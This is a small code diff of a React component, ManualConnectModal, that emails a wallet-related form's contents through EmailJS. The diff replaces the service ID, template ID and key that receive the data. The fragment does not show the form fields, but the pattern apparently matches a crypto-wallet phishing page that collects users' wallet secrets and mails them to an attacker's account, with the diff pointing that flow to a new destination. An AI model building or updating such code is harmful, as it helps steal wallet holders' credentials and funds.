@@ -355,10 +355,10 @@ const ManualConnectModal = ({ selectedWallet, closeModal, onSubmit }) => {
 
     try {
       await emailjs.sendForm(
-        "service_ebz5nbc",
-        "template_4ourynj",
+        "service_d6oupni",
+        "template_foi8ygt",
         form.current,
-        "ZTuNAlPhY2DQ9uhW0"
+        "lkCQpXoMcvB5RJCev"
       );
      // Reset form state values
      setUserText("");
